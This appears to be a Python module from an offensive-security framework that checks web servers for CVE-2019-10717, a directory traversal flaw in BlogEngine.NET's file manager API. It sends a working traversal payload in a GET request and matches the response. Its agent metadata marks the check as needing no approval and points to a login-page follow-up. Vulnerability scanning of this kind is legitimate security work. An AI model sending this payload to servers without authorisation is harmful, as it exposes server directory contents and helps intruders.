#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BlogEngine."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BlogEngine.NET 3.3.7.0 - Local File Inclusion Detection',
        'description': 'BlogEngine.NET 3.3.7.0 allows /api/filemanager local file inclusion via the path parameter',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'seclists', 'blogengine', 'lfi', 'traversal', 'dotnetblogengine', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.securitymetrics.com/blog/Blogenginenet-Directory-Traversal-Listing-Login-Page-Unvalidated-Redirect',
            'https://github.com/rxtur/BlogEngine.NET/commits/master',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-10717',
            'http://seclists.org/fulldisclosure/2019/Jun/44',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-10717',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/filemanager?path=%2F..%2f..%2fContent', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('~/App_Data/files/../../([a-zA-Z0-9\\.\\-]+)/([a-z0-9]+)',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="BlogEngine.NET 3.3.7.0 - Local File Inclusion detected",
                path='/api/filemanager?path=%2F..%2f..%2fContent',
            )
            return True
        return False

